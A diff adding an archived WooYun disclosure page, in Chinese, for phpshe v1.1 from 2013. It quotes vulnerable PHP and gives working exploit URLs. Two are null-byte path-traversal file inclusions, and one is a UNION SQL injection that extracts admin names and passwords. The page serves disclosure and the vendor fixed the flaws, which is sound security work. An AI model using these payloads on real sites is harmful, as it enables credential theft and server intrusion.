@@ -1,0 +1,326 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpshe v1.1 多处文件包含与SQL注射漏洞等  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpshe v1.1 多处文件包含与SQL注射漏洞等  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/knife">knife</a> 
+</li><li>提交时间：		2013-04-12 16:44</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-02：	细节向普通白帽子公开<br/>
+									2013-05-12：	细节向实习白帽子公开<br/>
+									2013-05-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">比较严重，综合利用起来<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/*******************************************************/<br />
+<br />
+/* Phpshe v1.1 Vulnerability<br />
+<br />
+/* ========================<br />
+<br />
+/* By: : Kn1f3<br />
+<br />
+/* E-Mail : 681796@qq.com<br />
+<br />
+/*========================<br />
+<br />
+/*******************************************************/<br />
+<br />
+/* Welcome to http://www.90sec.com */<br />
+<br />
+/*******************************************************/<br />
+<br />
+0x00 整体大概参数传输<br />
+<br />
+</p><pre><code>//common.php<br />
+if (get_magic_quotes_gpc()) {<br />
+	!empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, &#039;_g&#039;);<br />
+	!empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, &#039;_p&#039;);<br />
+}<br />
+else {<br />
+	!empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,&#039;_g&#039;);<br />
+	!empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,&#039;_p&#039;);<br />
+}<br />
+session_start();<br />
+!empty($_SESSION) &amp;&amp; extract(pe_trim($_SESSION),EXTR_PREFIX_ALL,&#039;_s&#039;);<br />
+!empty($_COOKIE) &amp;&amp; extract(pe_trim(pe_stripslashes($_COOKIE)),EXTR_PREFIX_ALL,&#039;_c&#039;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+0x01 包含漏洞<br />
+<br />
+</p><pre><code>//首页文件<br />
+<br />
+&lt;?php<br />
+include(&#039;common.php&#039;);<br />
+<br />
+$cache_category = cache::get(&#039;category&#039;);<br />
+$cache_category_arr = cache::get(&#039;category_arr&#039;);<br />
+$cache_class = cache::get(&#039;class&#039;);<br />
+<br />
+$cache_ad = cache::get(&#039;ad&#039;);<br />
+$cache_link = cache::get(&#039;link&#039;);<br />
+$cache_page = cache::get(&#039;page&#039;);<br />
+$web_qq = $cache_setting[&#039;web_qq&#039;][&#039;setting_value&#039;] ? explode(&#039;,&#039;, $cache_setting[&#039;web_qq&#039;][&#039;setting_value&#039;]) : array();<br />
+<br />
+$cart_num = pe_login(&#039;user&#039;) ? $db-&gt;pe_num(&#039;cart&#039;, array(&#039;user_id&#039;=&gt;$_s_user_id)) : (unserialize($_c_cart_list) ? count(unserialize($_c_cart_list)) : 0);<br />
+<br />
+include(&quot;{$pe[&#039;path_root&#039;]}module/{$module}/{$mod}.php&quot;);  //$mod可控造成“鸡肋”包含漏洞<br />
+pe_result();<br />
+?&gt;<br />
+<br />
+<br />
+//common 文件 第15行开始<br />
+url路由配置<br />
+$module = $mod = $act = &#039;index&#039;;<br />
+$mod = $_POST[&#039;mod&#039;] ? $_POST[&#039;mod&#039;] : ($_GET[&#039;mod&#039;] ? $_GET[&#039;mod&#039;] : $mod);<br />
+$act = $_POST[&#039;act&#039;] ? $_POST[&#039;act&#039;] : ($_GET[&#039;act&#039;] ? $_GET[&#039;act&#039;] : $act);<br />
+$id = $_POST[&#039;id&#039;] ? $_POST[&#039;id&#039;] : ($_GET[&#039;id&#039;] ? $_GET[&#039;id&#039;] : $id);<br />
+<br />
+//exp：<br />
+//http://127.0.0.1/phpshe_v1.1/index.php?mod=../../robots.txt%00</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+0x02 搜索注入<br />
+<br />
+</p><pre><code>//product.php文件<br />
+<br />
+case &#039;list&#039;:<br />
+		$category_id = intval($id);<br />
+		$info = $db-&gt;pe_select(&#039;category&#039;, array(&#039;category_id&#039;=&gt;$category_id));<br />
+		//搜索<br />
+		$sqlwhere = &quot; and `product_state` = 1&quot;;<br />
+		pe_lead(&#039;hook/category.hook.php&#039;);<br />
+		if ($category_id) {<br />
+			$sqlwhere .= is_array($category_cidarr = category_cidarr($category_id)) ? &quot; and `category_id` in(&#039;&quot;.implode(&quot;&#039;,&#039;&quot;, $category_cidarr).&quot;&#039;)&quot; : &quot; and `category_id` = &#039;{$category_id}&#039;&quot;;<br />
+		}<br />
+<br />
+		$_g_keyword &amp;&amp; $sqlwhere .= &quot; and `product_name` like &#039;%{$_g_keyword}%&#039;&quot;; //keyword变量未进行有效的sql语句过滤<br />
+		if ($_g_orderby) {<br />
+			$orderby = explode(&#039;_&#039;, $_g_orderby);<br />
+			$sqlwhere .= &quot; order by `product_{$orderby[0]}` {$orderby[1]}&quot;;<br />
+		}<br />
+		else {<br />
+			$sqlwhere .= &quot; order by `product_id` desc&quot;;<br />
+		}<br />
+		$info_list = $db-&gt;pe_selectall(&#039;product&#039;, $sqlwhere, &#039;*&#039;, array(16, $_g_page));<br />
+		//热卖排行<br />
+		$product_hotlist = product_hotlist();<br />
+		//当前路径<br />
+		$nowpath = category_path($category_id);<br />
+<br />
+		$seo = pe_seo($info[&#039;category_name&#039;]);<br />
+		include(pe_tpl(&#039;product_list.html&#039;));<br />
+		<br />
+		<br />
+//跟进selectall函数库<br />
+<br />
+	public function pe_selectall($table, $where = &#039;&#039;, $field = &#039;*&#039;, $limit_page = array())<br />
+	{<br />
+		//处理条件语句<br />
+		$sqlwhere = $this-&gt;_dowhere($where);<br />
+		return $this-&gt;sql_selectall(&quot;select {$field} from `&quot;.dbpre.&quot;{$table}` {$sqlwhere}&quot;, $limit_page);<br />
+	}<br />
+	<br />
+//exp <br />
+product/list?keyword=kn1f3&#039;+union+select+1,2,3,4,5,(select+concat(admin_name,0x27,admin_pw,0x27)+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19 and+&#039;1&#039;=&#039;1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+0x03 包含漏洞2<br />
+<br />
+</p><pre><code>//order.php<br />
+case &#039;pay&#039;:<br />
+		$order_id = pe_dbhold($_g_id);<br />
+		$cache_payway = cache::get(&#039;payway&#039;);<br />
+		foreach($cache_payway as $k =&gt; $v) {<br />
+			$cache_payway[$k][&#039;payway_config&#039;] = unserialize($cache_payway[$k][&#039;payway_config&#039;]);<br />
+			if ($k == &#039;bank&#039;) {<br />
+				$cache_payway[$k][&#039;payway_config&#039;][&#039;bank_text&#039;] = str_replace(array(&quot;\r&quot;, &quot;\n&quot;, &quot;\t&quot;), &#039;\n&#039;, $cache_payway[$k][&#039;payway_config&#039;][&#039;bank_text&#039;]);<br />
+			}<br />
+		}<br />
+		$order = $db-&gt;pe_select(&#039;order&#039;, array(&#039;order_id&#039;=&gt;$order_id, &#039;order_state&#039;=&gt;&#039;notpay&#039;));<br />
+		!$order[&#039;order_id&#039;] &amp;&amp; pe_error(&#039;订单号错误...&#039;);<br />
+		if (isset($_p_pesubmit)) {<br />
+			if ($db-&gt;pe_update(&#039;order&#039;, array(&#039;order_id&#039;=&gt;$order_id), $_p_info)) {<br />
+				$info_list = $db-&gt;pe_selectall(&#039;orderdata&#039;, array(&#039;order_id&#039;=&gt;$order_id));<br />
+				foreach ($info_list as $v) {<br />
+					$order[&#039;order_name&#039;] .= &quot;{$v[&#039;product_name&#039;]};&quot;;			<br />
+				}<br />
+				echo &#039;正在为您连接支付网站，请稍后...&#039;;<br />
+				include(&quot;{$pe[&#039;path_root&#039;]}include/plugin/payway/{$_p_info[&#039;order_payway&#039;]}/order_pay.php&quot;);<br />
+			}//当一切准备好的时候就可以进行&quot;鸡肋包含了&quot;<br />
+			else {<br />
+				pe_error(&#039;支付错误...&#039;);<br />
+			}<br />
+		}<br />
+		$seo = pe_seo(&#039;选择支付方式&#039;);<br />
+		include(pe_tpl(&#039;order_pay.html&#039;));<br />
+	break;<br />
+}<br />
+//exp：<br />
+//http://127.0.0.1/phpshe_v1.1/index.php?mod=order&amp;act=pay&amp;id=1304070001<br />
+//info%5Border_payway%5D=alipay/../../../1.txt%00&amp;pesubmit=%E7%AB%8B%E5%8D%B3%E6%94%AF%E4%BB%98</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/081804156f334c7f99f1fabc72037827ab76a42c.jpg" target="_blank"><img src="../images/081804156f334c7f99f1fabc72037827ab76a42c.jpg" alt="GGDP98D0T7QD`$60~B@_I%E.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0818043839233888e8401c1ca95b46d075d2088f.jpg" target="_blank"><img src="../images/0818043839233888e8401c1ca95b46d075d2088f.jpg" alt="NKU4ST~P`NH6DIAR@85RWIF.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/081804511e634c157c23cb747dfc944cf5bd17f2.jpg" target="_blank"><img src="../images/081804511e634c157c23cb747dfc944cf5bd17f2.jpg" alt="XEPHJZL51XZ%ARXPNEVGR@P.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">几个漏洞，过滤过滤在过滤<br />
+<br />
+<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/knife" title="knife">knife</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021406" title="phpshe v1.1 多处文件包含与SQL注射漏洞等">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-04-12 17:10</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢knife对phpshe代码审查，bug已修正！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21406";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
